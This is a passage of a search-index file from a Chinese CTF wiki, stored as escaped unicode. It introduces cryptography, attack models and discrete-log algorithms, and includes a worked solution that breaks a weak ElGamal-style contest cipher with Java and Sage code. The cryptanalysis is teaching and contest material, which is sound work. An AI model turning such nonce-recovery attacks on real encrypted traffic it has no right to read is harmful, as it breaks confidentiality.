\u5e74\u9999\u519c\uff08C. E. Shannon\uff09\u53d1\u8868\u4e86\u9898\u4e3a\u300a\u4fdd\u5bc6\u7cfb\u7edf\u7684\u901a\u4fe1\u7406\u8bba\u300b\u7684\u7ecf\u5178\u8bba\u6587\u6807\u5fd7\u7740\u73b0\u4ee3\u5bc6\u7801\u5b66\u7684\u5f00\u59cb\u3002\u73b0\u4ee3\u5bc6\u7801\u5b66\u4e3b\u8981\u5305\u542b\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\uff1a \u5bf9\u79f0\u52a0\u5bc6\uff08Symmetric Cryptography\uff09\uff0c\u4ee5 DES\uff0cAES\uff0cRC4 \u4e3a\u4ee3\u8868\u3002 \u975e\u5bf9\u79f0\u52a0\u5bc6\uff08Asymmetric Cryptography\uff09\uff0c\u4ee5 RSA\uff0cElGamal\uff0c\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u4e3a\u4ee3\u8868\u3002 \u54c8\u5e0c\u51fd\u6570\uff08Hash Function\uff09\uff0c\u4ee5 MD5\uff0cSHA-1\uff0cSHA-512 \u7b49\u4e3a\u4ee3\u8868\u3002 \u6570\u5b57\u7b7e\u540d\uff08Digital Signature\uff09\uff0c\u4ee5 RSA \u7b7e\u540d\uff0cElGamal \u7b7e\u540d\uff0cDSA \u7b7e\u540d\u4e3a\u4ee3\u8868\u3002 \u5176\u4e2d\uff0c\u5bf9\u79f0\u52a0\u5bc6\u4f53\u5236\u4e3b\u8981\u5206\u4e3a\u4e24\u79cd\u65b9\u5f0f\uff1a \u5206\u7ec4\u5bc6\u7801\uff08Block Cipher\uff09\uff0c\u53c8\u79f0\u4e3a\u5757\u5bc6\u7801\u3002 \u5e8f\u5217\u5bc6\u7801\uff08Stream Cipher\uff09\uff0c\u53c8\u79f0\u4e3a\u6d41\u5bc6\u7801\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u5bc6\u7801\u8bbe\u8ba1\u8005\u7684\u6839\u672c\u76ee\u6807\u662f\u4fdd\u969c\u4fe1\u606f\u53ca\u4fe1\u606f\u7cfb\u7edf\u7684 \u673a\u5bc6\u6027\uff08Confidentiality\uff09 \u5b8c\u6574\u6027\uff08Integrity\uff09 \u53ef\u7528\u6027\uff08Availability\uff09 \u8ba4\u8bc1\u6027\uff08Authentication\uff09 \u4e0d\u53ef\u5426\u8ba4\u6027\uff08Non-repudiation\uff09 \u5176\u4e2d\uff0c\u524d\u4e09\u8005\u88ab\u79f0\u4e3a\u4fe1\u606f\u5b89\u5168\u7684 CIA \u4e09\u8981\u7d20 \u3002 \u800c\u5bf9\u4e8e\u5bc6\u7801\u7834\u89e3\u8005\u6765\u8bf4\uff0c\u4e00\u822c\u662f\u8981\u60f3\u529e\u6cd5\u8bc6\u522b\u51fa\u5bc6\u7801\u7b97\u6cd5\uff0c\u7136\u540e\u8fdb\u884c\u66b4\u529b\u7834\u89e3\uff0c\u6216\u8005\u5229\u7528\u5bc6\u7801\u4f53\u5236\u7684\u6f0f\u6d1e\u8fdb\u884c\u7834\u89e3\u3002\u5f53\u7136\uff0c\u4e5f\u6709\u53ef\u80fd\u901a\u8fc7\u6784\u9020\u865a\u5047\u7684\u54c8\u5e0c\u503c\u6216\u8005\u6570\u5b57\u7b7e\u540d\u6765\u7ed5\u8fc7\u76f8\u5e94\u7684\u68c0\u6d4b\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u90fd\u4f1a\u5047\u8bbe\u653b\u51fb\u8005\u5df2\u77e5\u5f85\u7834\u89e3\u7684\u5bc6\u7801\u4f53\u5236\uff0c\u800c\u653b\u51fb\u7c7b\u578b\u901a\u5e38\u5206\u4e3a\u4ee5\u4e0b\u56db\u79cd\uff1a \u653b\u51fb\u7c7b\u578b \u8bf4\u660e \u552f\u5bc6\u6587\u653b\u51fb \u53ea\u62e5\u6709\u5bc6\u6587 \u5df2\u77e5\u660e\u6587\u653b\u51fb \u62e5\u6709\u5bc6\u6587\u4e0e\u5bf9\u5e94\u7684\u660e\u6587 \u9009\u62e9\u660e\u6587\u653b\u51fb \u62e5\u6709\u52a0\u5bc6\u6743\u9650\uff0c\u80fd\u591f\u5bf9\u660e\u6587\u52a0\u5bc6\u540e\u83b7\u5f97\u76f8\u5e94\u5bc6\u6587 \u9009\u62e9\u5bc6\u6587\u653b\u51fb \u62e5\u6709\u89e3\u5bc6\u6743\u9650\uff0c\u80fd\u591f\u5bf9\u5bc6\u6587\u89e3\u5bc6\u540e\u83b7\u5f97\u76f8\u5e94\u660e\u6587 Note \u6ce8\uff1a\u4e4b\u524d\u5728\u8fd9\u91cc\u66fe\u5199\u8fc7\u8fd9\u4e9b\u653b\u51fb\u5e38\u89c1\u7684\u573a\u666f\uff0c\u968f\u7740\u4e0d\u65ad\u5730\u5b66\u4e60\uff0c\u6e10\u6e10\u610f\u8bc6\u5230\u8fd9\u4e9b\u653b\u51fb\u7c7b\u578b\u4fa7\u91cd\u63cf\u8ff0\u653b\u51fb\u8005\u7684\u80fd\u529b\uff0c\u6709\u53ef\u80fd\u9002\u7528\u4e8e\u5404\u79cd\u5404\u6837\u7684\u573a\u666f\u3002\u6545\u8fdb\u884c\u4fee\u6b63\u3002 \u8fd9\u91cc\u63a8\u8350\u4e00\u4e9b\u8d44\u6599 \u53ef\u6c57\u5b66\u9662\u516c\u5f00\u8bfe \u6df1\u5165\u6d45\u51fa\u5bc6\u7801\u5b66\u2014\u2014\u5e38\u7528\u52a0\u5bc6\u6280\u672f\u539f\u7406\u4e0e\u5e94\u7528 https://cryptopals.com/ \uff0c\u4e00\u5806\u5bc6\u7801\u5b66\u7684\u7ec3\u4e60\u9898\u76ee\u3002 Note \u63a8\u8350\u5728\u770b\u5b8c\u516c\u5f00\u8bfe\u7684\u60c5\u51b5\u4e0b\uff0c\u4ee5\u53ca\u7b80\u5355\u770b\u770b\u7535\u5b50\u4e66\u7684\u60c5\u51b5\u4e0b\u5728\u8003\u8651\u662f\u5426\u8981\u8d2d\u4e70\u4e66\uff0c\u56e0\u4e3a\u4e66\u4e70\u56de\u6765\u4e00\u822c\u90fd\u88ab\u95f2\u7f6e\u8d77\u6765\u4e86\u3002","title":"\u5bc6\u7801\u5b66\u7b80\u4ecb"},{"location":"crypto/introduction/#_2","text":"\u7ef4\u57fa\u767e\u79d1-\u5bc6\u7801\u5b66 Info \u672c\u8282\u5927\u90e8\u5206\u5b9a\u4e49\u4e0e\u4f8b\u5b50\u53c2\u8003\u4e86\u7ef4\u57fa\u767e\u79d1\u3002","title":"\u53c2\u8003"},{"location":"crypto/asymmetric/introduction/","text":"\u4ecb\u7ecd \u00b6 \u5728\u975e\u5bf9\u79f0\u5bc6\u7801\u4e2d\uff0c\u52a0\u5bc6\u8005\u4e0e\u89e3\u5bc6\u8005\u6240\u4f7f\u7528\u7684\u5bc6\u94a5\u5e76\u4e0d\u4e00\u6837\uff0c\u5178\u578b\u7684\u6709 RSA \u52a0\u5bc6\uff0c\u80cc\u5305\u52a0\u5bc6\uff0c\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u3002","title":"\u4ecb\u7ecd"},{"location":"crypto/asymmetric/introduction/#_1","text":"\u5728\u975e\u5bf9\u79f0\u5bc6\u7801\u4e2d\uff0c\u52a0\u5bc6\u8005\u4e0e\u89e3\u5bc6\u8005\u6240\u4f7f\u7528\u7684\u5bc6\u94a5\u5e76\u4e0d\u4e00\u6837\uff0c\u5178\u578b\u7684\u6709 RSA \u52a0\u5bc6\uff0c\u80cc\u5305\u52a0\u5bc6\uff0c\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u3002","title":"\u4ecb\u7ecd"},{"location":"crypto/asymmetric/discrete-log/discrete-log/","text":"\u79bb\u6563\u5bf9\u6570 \u00b6 \u57fa\u672c\u5b9a\u4e49 \u00b6 \u5728\u4e86\u89e3\u79bb\u6563\u5bf9\u6570\u65f6\uff0c\u6211\u4eec\u5148\u6765\u4e86\u89e3\u51e0\u4e2a\u57fa\u672c\u5b9a\u4e49\u3002 \u5b9a\u4e491 \u5728\u7fa4 G \u4e2d\uff0cg \u4e3a G \u7684\u751f\u6210\u5143\uff0c\u4e5f\u5c31\u662f\u8bf4\u7fa4 G \u4e2d\u6bcf\u4e00\u4e2a\u5143\u7d20\u90fd\u53ef\u4ee5\u5199\u6210 y=g^k y=g^k \uff0c\u6211\u4eec\u79f0 k \u4e3a y \u5728\u7fa4 G \u4e2d\u7684\u5bf9\u6570\u3002 \u5b9a\u4e492 \u8bbe m\\geq 1 m\\geq 1 \uff0c (a,m)=1 (a,m)=1 \uff0c\u4f7f\u5f97 a^d \\equiv 1\\pmod m a^d \\equiv 1\\pmod m \u6210\u7acb\u7684\u6700\u5c0f\u6b63\u6574\u6570 d \u79f0\u4e3a a \u5bf9\u6a21 m \u7684\u6307\u6570\u6216\u8005\u9636\uff0c\u6211\u4eec\u4e00\u822c\u5c06\u5176\u8bb0\u4e3a \\delta_m(a) \\delta_m(a) \u3002 \u5b9a\u4e493 \u5f53 \\delta_m(a)=\\varphi(m) \\delta_m(a)=\\varphi(m) \u65f6\uff0c\u79f0 a \u662f\u6a21 m \u7684\u539f\u6839\uff0c\u7b80\u79f0 m \u7684\u539f\u6839\u3002 \u4e00\u4e9b\u6027\u8d28 \u00b6 \u6027\u8d281 \u4f7f\u5f97 a^d \\equiv 1\\pmod m a^d \\equiv 1\\pmod m \u6210\u7acb\u7684\u6700\u5c0f\u6b63\u6574\u6570 d d \uff0c\u5fc5\u6709 d\\mid\\varphi(m) d\\mid\\varphi(m) \u3002 \u6027\u8d282 \u6a21 m m \u5269\u4f59\u7cfb\u5b58\u5728\u539f\u6839\u7684\u5145\u8981\u6761\u4ef6\u662f m=2,4,p^{\\alpha},2p^{\\alpha} m=2,4,p^{\\alpha},2p^{\\alpha} \uff0c\u5176\u4e2d p p \u4e3a\u5947\u7d20\u6570\uff0c \\alpha \\alpha \u4e3a\u6b63\u6574\u6570\u3002 \u79bb\u6563\u5bf9\u6570\u95ee\u9898 \u00b6 \u5df2\u77e5 g,p,y g,p,y \uff0c\u5bf9\u4e8e\u65b9\u7a0b y\\equiv g^x \\pmod p y\\equiv g^x \\pmod p \uff0c\u6c42\u89e3 x x \u662f\u4e00\u4e2a\u96be\u89e3\u95ee\u9898\u3002\u4f46\u662f\u5f53 p p \u5177\u6709\u4e00\u5b9a\u7684\u7279\u6027\u65f6\u5c31\u53ef\u80fd\u53ef\u4ee5\u6c42\u89e3\uff0c\u6bd4\u5982\uff0c\u8fd9\u4e2a\u7fa4\u7684\u9636\u662f\u4e00\u4e2a\u5149\u6ed1\u6570\u3002 \u6b63\u662f\u4e0a\u8ff0\u8fd9\u4e2a\u95ee\u9898\u6784\u6210\u4e86\u76ee\u524d\u5f88\u5927\u4e00\u90e8\u5206\u73b0\u4ee3\u5bc6\u7801\u5b66\uff0c\u5305\u62ec Diffie\u2013Hellman \u5bc6\u94a5\u4ea4\u6362\uff0c ElGamal \u7b97\u6cd5\uff0cECC \u7b49\u3002 \u79bb\u6563\u5bf9\u6570\u6c42\u89e3\u65b9\u5f0f \u00b6 \u66b4\u529b\u7834\u89e3 \u00b6 \u7ed9\u5b9a y\\equiv g^x \\pmod p y\\equiv g^x \\pmod p \uff0c\u6211\u4eec\u53ef\u4ee5\u66b4\u529b\u679a\u4e3e x x \u4ece\u800c\u5f97\u5230\u771f\u6b63\u7684 x x \u7684\u503c\u3002 Baby-step giant-step \u00b6 \u8fd9\u4e00\u65b9\u6cd5\u901a\u5e38\u88ab\u79f0\u4e3a\u5c0f\u6b65\u5927\u6b65\u6cd5\uff0c\u8fd9\u4e00\u65b9\u6cd5\u4f7f\u7528\u4e86\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\u7684\u601d\u60f3\u3002 \u6211\u4eec\u53ef\u4ee5\u4ee4 x=im+j x=im+j \uff0c\u5176\u4e2d m= \\lceil \\sqrt n\\rceil m= \\lceil \\sqrt n\\rceil \uff0c\u90a3\u4e48\u6574\u6570 i \u548c j \u90fd\u5728 0 \u5230 m \u7684\u8303\u56f4\u5185\u3002 \u56e0\u6b64 y=g^x=g^{im+j} y=g^x=g^{im+j} \u4e5f\u5c31\u662f y(g^{-m})^i=g^j y(g^{-m})^i=g^j \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u679a\u4e3e\u6240\u6709\u7684 j \u5e76\u8fdb\u884c\u8ba1\u7b97\uff0c\u5e76\u5c06\u5176\u5b58\u50a8\u5230\u4e00\u4e2a\u96c6\u5408 S \u4e2d\uff0c\u7136\u540e\u6211\u4eec\u518d\u6b21\u679a\u4e3e i\uff0c\u8ba1\u7b97 y(g^{-m})^i y(g^{-m})^i \uff0c\u4e00\u65e6\u6211\u4eec\u53d1\u73b0\u8ba1\u7b97\u7684\u7ed3\u679c\u5728\u96c6\u5408 S \u4e2d\uff0c\u5219\u8bf4\u660e\u6211\u4eec\u5f97\u5230\u4e86\u4e00\u4e2a\u78b0\u649e\uff0c\u8fdb\u800c\u5f97\u5230\u4e86 i \u548c j\u3002 \u8fd9\u663e\u7136\u662f\u4e00\u4e2a\u65f6\u95f4\u4e0e\u7a7a\u95f4\u7684\u6298\u4e2d\u7684\u65b9\u5f0f\uff0c\u6211\u4eec\u5c06\u4e00\u4e2a O(n) O(n) \u7684\u65f6\u95f4\u590d\u6742\u5ea6\uff0c O(1) O(1) \u7a7a\u95f4\u590d\u6742\u5ea6\u7684\u7b97\u6cd5\u8f6c\u6362\u4e3a\u4e86\u4e00\u4e2a O(\\sqrt n) O(\\sqrt n) \u7684\u65f6\u95f4\u590d\u6742\u5ea6\u548c O(\\sqrt n) O(\\sqrt n) \u7684\u7a7a\u95f4\u590d\u6742\u5ea6\u7684\u7b97\u6cd5\u3002 \u5176\u4e2d \u6bcf\u4e00\u6b21 j \u7684\u589e\u52a0\u8868\u793a\u201cbaby-step\u201d\uff0c\u4e00\u6b21\u4e58\u4e0a g g \u3002 \u6bcf\u4e00\u6b21 i \u7684\u589e\u52a0\u8868\u793a\u201cgiant-step\u201d\uff0c\u4e00\u6b21\u4e58\u4e0a g^{-m} g^{-m} \u3002 def bsgs ( g , y , p ): m = int ( ceil ( sqrt ( p - 1 ))) S = { pow ( g , j , p ): j for j in range ( m )} gs = pow ( g , p - 1 - m , p ) for i in range ( m ): if y in S : return i * m + S [ y ] y = y * gs % p return None Pollard\u2019s \u03c1 algorithm \u00b6 \u6211\u4eec\u53ef\u4ee5\u4ee5 O(\\sqrt n) O(\\sqrt n) \u7684\u65f6\u95f4\u590d\u6742\u5ea6\u548c O(1) O(1) \u7684\u7a7a\u95f4\u590d\u6742\u5ea6\u6765\u89e3\u51b3\u4e0a\u8ff0\u95ee\u9898\u3002\u5177\u4f53\u539f\u7406\u8bf7\u81ea\u884c\u8c37\u6b4c\u3002 Pollard\u2019s kangaroo algorithm \u00b6 \u5982\u679c\u6211\u4eec\u77e5\u9053 x \u7684\u8303\u56f4\u4e3a a \\leq x \\leq b a \\leq x \\leq b \uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4ee5 O(\\sqrt{b-a}) O(\\sqrt{b-a}) \u7684\u65f6\u95f4\u590d\u6742\u5ea6\u89e3\u51b3\u4e0a\u8ff0\u95ee\u9898\u3002\u5177\u4f53\u539f\u7406\u8bf7\u81ea\u884c\u8c37\u6b4c\u3002 Pohlig-Hellman algorithm \u00b6 \u4e0d\u59a8\u5047\u8bbe\u4e0a\u8ff0\u6240\u63d0\u5230\u7684\u7fa4\u5173\u4e8e\u5143\u7d20 g g \u7684\u9636\u4e3a n n \uff0c n n \u4e3a\u4e00\u4e2a\u5149\u6ed1\u6570\uff1a n=\\prod\\limits_{i=1}^r p_i^{e_i} n=\\prod\\limits_{i=1}^r p_i^{e_i} \u3002 \u5bf9\u4e8e\u6bcf\u4e2a i \\in \\{1,\\ldots,r\\} i \\in \\{1,\\ldots,r\\} \uff1a \u8ba1\u7b97 g_i \\equiv g^{n/p_i^{e_i}} \\pmod m g_i \\equiv g^{n/p_i^{e_i}} \\pmod m \u3002\u6839\u636e\u62c9\u683c\u6717\u65e5\u5b9a\u7406\uff0c g_i g_i \u5728\u7fa4\u4e2d\u7684\u9636\u4e3a p_i^{e_i} p_i^{e_i} \u3002 \u8ba1\u7b97 y_i \\equiv y^{n/p_i^{e_i}} \\equiv g^{xn/p_i^{e_i}} \\equiv g_i^{x} \\equiv g_i^{x \\bmod p_i^{e_i}} \\equiv g_i^{x_i} \\pmod m y_i \\equiv y^{n/p_i^{e_i}} \\equiv g^{xn/p_i^{e_i}} \\equiv g_i^{x} \\equiv g_i^{x \\bmod p_i^{e_i}} \\equiv g_i^{x_i} \\pmod m \uff0c\u8fd9\u91cc\u6211\u4eec\u77e5\u9053 y_i,m,g_i y_i,m,g_i \uff0c\u800c x_i x_i \u7684\u8303\u56f4\u4e3a [0,p_i^{e_i}) [0,p_i^{e_i}) \uff0c\u7531 n n \u662f\u4e00\u4e2a\u5149\u6ed1\u6570\uff0c\u53ef\u77e5\u5176\u8303\u56f4\u8f83\u5c0f\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Pollard\u2019s kangaroo algorithm \u7b49\u65b9\u6cd5\u5feb\u901f\u6c42\u5f97 x_i x_i \u3002 \u6839\u636e\u4e0a\u8ff0\u7684\u63a8\u5bfc\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5bf9\u4e8e i \\in \\{1,\\ldots,r\\} i \\in \\{1,\\ldots,r\\} \uff0c x \\equiv x_i \\pmod{p_i^{e_i}} x \\equiv x_i \\pmod{p_i^{e_i}} \uff0c\u8be5\u5f0f\u53ef\u7528\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\u6c42\u89e3\u3002 \u4e0a\u8ff0\u8fc7\u7a0b\u53ef\u7528\u4e0b\u56fe\u7b80\u5355\u63cf\u8ff0\uff1a \u5176\u590d\u6742\u5ea6\u4e3a O\\left(\\sum\\limits _i e_i\\left(\\log n+\\sqrt{p_i}\\right)\\right) O\\left(\\sum\\limits _i e_i\\left(\\log n+\\sqrt{p_i}\\right)\\right) \uff0c\u53ef\u4ee5\u770b\u51fa\u590d\u6742\u5ea6\u8fd8\u662f\u5f88\u4f4e\u7684\u3002 \u4f46\u5f53 n n \u4e3a\u7d20\u6570\uff0c m=2n+1 m=2n+1 \uff0c\u90a3\u4e48\u590d\u6742\u5ea6\u548c O(\\sqrt m) O(\\sqrt m) \u662f\u51e0\u4e4e\u6ca1\u6709\u5dee\u522b\u7684\u3002 2018 \u56fd\u8d5b crackme java \u00b6 \u4ee3\u7801\u5982\u4e0b import java.math.BigInteger ; import java.util.Random ; public class Test1 { static BigInteger two = new BigInteger ( \"2\" ); static BigInteger p = new BigInteger ( \"11360738295177002998495384057893129964980131806509572927886675899422214174408333932150813939357279703161556767193621832795605708456628733877084015367497711\" ); static BigInteger h = new BigInteger ( \"7854998893567208831270627233155763658947405610938106998083991389307363085837028364154809577816577515021560985491707606165788274218742692875308216243966916\" ); /* Alice write the below algorithm for encryption. The public key {p, h} is broadcasted to everyone. @param val: The plaintext to encrypt. We suppose val only contains lowercase letter {a-z} and numeric charactors, and is at most 256 charactors in length. */ public static String pkEnc ( String val ){ BigInteger [] ret = new BigInteger [ 2 ] ; BigInteger bVal = new BigInteger ( val . toLowerCase (), 36 ); BigInteger r = new BigInteger ( new Random (). nextInt () + \"\" ); ret [ 0 ]= two . modPow ( r , p ); ret [ 1 ]= h . modPow ( r , p ). multiply ( bVal ); return ret [ 0 ] . toString ( 36 ) + \"==\" + ret [ 1 ] . toString ( 36 ); } /* Alice write the below algorithm for decryption. x is her private key, which she will never let you know. public static String skDec(String val,BigInteger x){ if(!val.contains(\"==\")){ return null; } else { BigInteger val0=new BigInteger(val.split(\"==\")[0],36); BigInteger val1=new BigInteger(val.split(\"==\")[1],36); BigInteger s=val0.modPow(x,p).modInverse(p); return val1.multiply(s).mod(p).toString(36); } } */ public static void main ( String [] args ) throws Exception { System . out . println ( \"You intercepted the following message, which is sent from Bob to Alice:\" ); BigInteger bVal1 = new BigInteger ( \"a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco\" , 36 ); BigInteger bVal2 = new BigInteger ( \"2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc\" , 36 ); BigInteger r = new BigInteger ( new Random (). nextInt () + \"\" ); System . out . println ( r ); System . out . println ( bVal1 ); System . out . println ( bVal2 ); System . out . println ( \"a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco==2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc\" ); System . out . println ( \"Please figure out the plaintext!\" ); } } \u57fa\u672c\u529f\u80fd\u4e3a\u8ba1\u7b97 r_0=2^r \\bmod p r_0=2^r \\bmod p r_1 =b*h^r \\bmod p r_1 =b*h^r \\bmod p \u53ef\u4ee5\u53d1\u73b0\uff0cr \u7684\u8303\u56f4\u4e3a [0,2^{32}) [0,2^{32}) \uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 BSGS \u7b97\u6cd5\uff0c\u5982\u4e0b from sage.all import * c1 = int ( 'a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco' , 36 ) c2 = int ( '2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc' , 36 ) print c1 , c2 p = 11360738295177002998495384057893129964980131806509572927886675899422214174408333932150813939357279703161556767193621832795605708456628733877084015367497711 h = 7854998893567208831270627233155763658947405610938106998083991389307363085837028364154809577816577515021560985491707606165788274218742692875308216243966916 # generate the group const2 = 2 const2 = Mod ( const2 , p ) c1 = Mod ( c1 , p ) c2 = Mod ( c2 , p ) h = Mod ( h , p ) print '2' , bsgs ( const2 , c1 , bounds = ( 1 , 2 ^ 32 )) r = 152351913 num = long ( c2 / ( h ** r )) print num \u53c2\u8003 \u00b6 \u521d\u7b49\u6570\u8bba\uff0c\u6f58\u627f\u6d1e\uff0c\u6f58\u627f\u5f6a https://ee.stanford.edu/~hellman/publications/28.pdf https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm#cite_note-Menezes97p108-2 https://fortenf.org/e/crypto/2017/12/03/survey-of-discrete-log-algos.html","title":"\u79bb\u6563\u5bf9\u6570"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#_1","text":"","title":"\u79bb\u6563\u5bf9\u6570"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#_2","text":"\u5728\u4e86\u89e3\u79bb\u6563\u5bf9\u6570\u65f6\uff0c\u6211\u4eec\u5148\u6765\u4e86\u89e3\u51e0\u4e2a\u57fa\u672c\u5b9a\u4e49\u3002 \u5b9a\u4e491 \u5728\u7fa4 G \u4e2d\uff0cg \u4e3a G \u7684\u751f\u6210\u5143\uff0c\u4e5f\u5c31\u662f\u8bf4\u7fa4 G \u4e2d\u6bcf\u4e00\u4e2a\u5143\u7d20\u90fd\u53ef\u4ee5\u5199\u6210 y=g^k y=g^k \uff0c\u6211\u4eec\u79f0 k \u4e3a y \u5728\u7fa4 G \u4e2d\u7684\u5bf9\u6570\u3002 \u5b9a\u4e492 \u8bbe m\\geq 1 m\\geq 1 \uff0c (a,m)=1 (a,m)=1 \uff0c\u4f7f\u5f97 a^d \\equiv 1\\pmod m a^d \\equiv 1\\pmod m \u6210\u7acb\u7684\u6700\u5c0f\u6b63\u6574\u6570 d \u79f0\u4e3a a \u5bf9\u6a21 m \u7684\u6307\u6570\u6216\u8005\u9636\uff0c\u6211\u4eec\u4e00\u822c\u5c06\u5176\u8bb0\u4e3a \\delta_m(a) \\delta_m(a) \u3002 \u5b9a\u4e493 \u5f53 \\delta_m(a)=\\varphi(m) \\delta_m(a)=\\varphi(m) \u65f6\uff0c\u79f0 a \u662f\u6a21 m \u7684\u539f\u6839\uff0c\u7b80\u79f0 m \u7684\u539f\u6839\u3002","title":"\u57fa\u672c\u5b9a\u4e49"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#_3","text":"\u6027\u8d281 \u4f7f\u5f97 a^d \\equiv 1\\pmod m a^d \\equiv 1\\pmod m \u6210\u7acb\u7684\u6700\u5c0f\u6b63\u6574\u6570 d d \uff0c\u5fc5\u6709 d\\mid\\varphi(m) d\\mid\\varphi(m) \u3002 \u6027\u8d282 \u6a21 m m \u5269\u4f59\u7cfb\u5b58\u5728\u539f\u6839\u7684\u5145\u8981\u6761\u4ef6\u662f m=2,4,p^{\\alpha},2p^{\\alpha} m=2,4,p^{\\alpha},2p^{\\alpha} \uff0c\u5176\u4e2d p p \u4e3a\u5947\u7d20\u6570\uff0c \\alpha \\alpha \u4e3a\u6b63\u6574\u6570\u3002","title":"\u4e00\u4e9b\u6027\u8d28"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#_4","text":"\u5df2\u77e5 g,p,y g,p,y \uff0c\u5bf9\u4e8e\u65b9\u7a0b y\\equiv g^x \\pmod p y\\equiv g^x \\pmod p \uff0c\u6c42\u89e3 x x \u662f\u4e00\u4e2a\u96be\u89e3\u95ee\u9898\u3002\u4f46\u662f\u5f53 p p \u5177\u6709\u4e00\u5b9a\u7684\u7279\u6027\u65f6\u5c31\u53ef\u80fd\u53ef\u4ee5\u6c42\u89e3\uff0c\u6bd4\u5982\uff0c\u8fd9\u4e2a\u7fa4\u7684\u9636\u662f\u4e00\u4e2a\u5149\u6ed1\u6570\u3002 \u6b63\u662f\u4e0a\u8ff0\u8fd9\u4e2a\u95ee\u9898\u6784\u6210\u4e86\u76ee\u524d\u5f88\u5927\u4e00\u90e8\u5206\u73b0\u4ee3\u5bc6\u7801\u5b66\uff0c\u5305\u62ec Diffie\u2013Hellman \u5bc6\u94a5\u4ea4\u6362\uff0c ElGamal \u7b97\u6cd5\uff0cECC \u7b49\u3002","title":"\u79bb\u6563\u5bf9\u6570\u95ee\u9898"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#_5","text":"","title":"\u79bb\u6563\u5bf9\u6570\u6c42\u89e3\u65b9\u5f0f"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#_6","text":"\u7ed9\u5b9a y\\equiv g^x \\pmod p y\\equiv g^x \\pmod p \uff0c\u6211\u4eec\u53ef\u4ee5\u66b4\u529b\u679a\u4e3e x x \u4ece\u800c\u5f97\u5230\u771f\u6b63\u7684 x x \u7684\u503c\u3002","title":"\u66b4\u529b\u7834\u89e3"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#baby-step-giant-step","text":"\u8fd9\u4e00\u65b9\u6cd5\u901a\u5e38\u88ab\u79f0\u4e3a\u5c0f\u6b65\u5927\u6b65\u6cd5\uff0c\u8fd9\u4e00\u65b9\u6cd5\u4f7f\u7528\u4e86\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\u7684\u601d\u60f3\u3002 \u6211\u4eec\u53ef\u4ee5\u4ee4 x=im+j x=im+j \uff0c\u5176\u4e2d m= \\lceil \\sqrt n\\rceil m= \\lceil \\sqrt n\\rceil \uff0c\u90a3\u4e48\u6574\u6570 i \u548c j \u90fd\u5728 0 \u5230 m \u7684\u8303\u56f4\u5185\u3002 \u56e0\u6b64 y=g^x=g^{im+j} y=g^x=g^{im+j} \u4e5f\u5c31\u662f y(g^{-m})^i=g^j y(g^{-m})^i=g^j \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u679a\u4e3e\u6240\u6709\u7684 j \u5e76\u8fdb\u884c\u8ba1\u7b97\uff0c\u5e76\u5c06\u5176\u5b58\u50a8\u5230\u4e00\u4e2a\u96c6\u5408 S \u4e2d\uff0c\u7136\u540e\u6211\u4eec\u518d\u6b21\u679a\u4e3e i\uff0c\u8ba1\u7b97 y(g^{-m})^i y(g^{-m})^i \uff0c\u4e00\u65e6\u6211\u4eec\u53d1\u73b0\u8ba1\u7b97\u7684\u7ed3\u679c\u5728\u96c6\u5408 S \u4e2d\uff0c\u5219\u8bf4\u660e\u6211\u4eec\u5f97\u5230\u4e86\u4e00\u4e2a\u78b0\u649e\uff0c\u8fdb\u800c\u5f97\u5230\u4e86 i \u548c j\u3002 \u8fd9\u663e\u7136\u662f\u4e00\u4e2a\u65f6\u95f4\u4e0e\u7a7a\u95f4\u7684\u6298\u4e2d\u7684\u65b9\u5f0f\uff0c\u6211\u4eec\u5c06\u4e00\u4e2a O(n) O(n) \u7684\u65f6\u95f4\u590d\u6742\u5ea6\uff0c O(1) O(1) \u7a7a\u95f4\u590d\u6742\u5ea6\u7684\u7b97\u6cd5\u8f6c\u6362\u4e3a\u4e86\u4e00\u4e2a O(\\sqrt n) O(\\sqrt n) \u7684\u65f6\u95f4\u590d\u6742\u5ea6\u548c O(\\sqrt n) O(\\sqrt n) 